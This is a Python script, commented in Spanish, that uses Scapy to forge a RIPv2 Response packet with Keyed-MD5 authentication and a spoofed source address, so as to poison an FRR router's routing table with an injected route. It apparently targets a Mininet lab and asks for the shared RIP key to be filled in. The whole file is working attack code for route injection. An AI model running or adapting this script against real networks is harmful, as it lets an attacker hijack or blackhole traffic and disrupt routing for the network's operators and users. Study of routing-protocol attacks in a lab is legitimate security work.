#!/usr/bin/env python3
"""
inject_rip.py -- Construye y envía un paquete RIPv2 Response falsificado,
firmado con Keyed-MD5 (RFC 2082), para envenenar la tabla de rutas de un
router FRR objetivo. Debe correr dentro de un host de Mininet en el mismo
segmento L2 que el router objetivo.

"""

import hashlib
import struct
import sys
from scapy.all import IP, UDP, Ether, sendp

# --- CONFIGURACIÓN ---
IFACE = "h1-eth0"

SPOOFED_SRC_IP = "10.0.1.254"
DST_IP = "224.0.0.9"
DST_MAC = "01:00:5e:00:00:09"

KEY_ID = 1
RIP_KEY = "REEMPLAZAR_CON_LA_KEY"
SEQ_NUMBER = 100

POISON_NETWORK = "192.168.99.0"
POISON_MASK = "255.255.255.0"
POISON_NEXT_HOP = "0.0.0.0"
POISON_METRIC = 1


def ip_to_bytes(ip: str) -> bytes:
    return bytes(int(o) for o in ip.split("."))


def build_route_rte(network, mask, next_hop, metric, route_tag=0, afi=2):
    return (
        struct.pack("!H", afi)
        + struct.pack("!H", route_tag)
        + ip_to_bytes(network)
        + ip_to_bytes(mask)
        + ip_to_bytes(next_hop)
        + struct.pack("!I", metric)
    )


def build_auth_header_rte(packet_len, key_id, seq_number, auth_data_len=20):
    return (
        struct.pack("!H", 0xFFFF)
        + struct.pack("!H", 3)
        + struct.pack("!H", packet_len)
        + struct.pack("!B", key_id)
        + struct.pack("!B", auth_data_len)
        + struct.pack("!I", seq_number)
        + b"\x00" * 8
    )


def keyed_md5_digest(hmac_base: bytes, key: str) -> bytes:
    # NO es HMAC real: MD5 de un solo paso sobre (datos + key rellenada a 16 bytes)
    key_bytes = key.encode()
    if len(key_bytes) > 16:
        raise ValueError("la key no puede pasar de 16 bytes")
    return hashlib.md5(hmac_base + key_bytes.ljust(16, b"\x00")).digest()


def build_rip_packet(command, version, key_id, seq_number, key, routes):
    header = struct.pack("!BBH", command, version, 0)
    route_rtes = b"".join(build_route_rte(*r) for r in routes)
    packet_len = len(header) + 20 + len(route_rtes)
    auth_header = build_auth_header_rte(packet_len, key_id, seq_number)
    hmac_base = header + auth_header + route_rtes
    digest = keyed_md5_digest(hmac_base, key)
    trailer = struct.pack("!H", 0xFFFF) + struct.pack("!H", 1) + digest
    return hmac_base + trailer


def inject():
    rip_payload = build_rip_packet(
        command=2,
        version=2,
        key_id=KEY_ID,
        seq_number=SEQ_NUMBER,
        key=RIP_KEY,
        routes=[(POISON_NETWORK, POISON_MASK, POISON_NEXT_HOP, POISON_METRIC)],
    )

    pkt = (
        Ether(dst=DST_MAC)
        / IP(src=SPOOFED_SRC_IP, dst=DST_IP, ttl=1)
        / UDP(sport=520, dport=520)
        / rip_payload
    )

    print(f"[+] Paquete RIP construido ({len(rip_payload)} bytes)")
    print(f"[+] Enviando por {IFACE}: {SPOOFED_SRC_IP} -> {DST_IP}, "
          f"envenenando {POISON_NETWORK}/{POISON_MASK}")

    sendp(pkt, iface=IFACE, verbose=True)
    print("[+] Enviado. Verifica con: vtysh -c 'show ip route'")


if __name__ == "__main__":
    if RIP_KEY.startswith("REEMPLAZAR"):
        print("!! Edita RIP_KEY y SEQ_NUMBER antes de correr esto.")
        sys.exit(1)
    inject()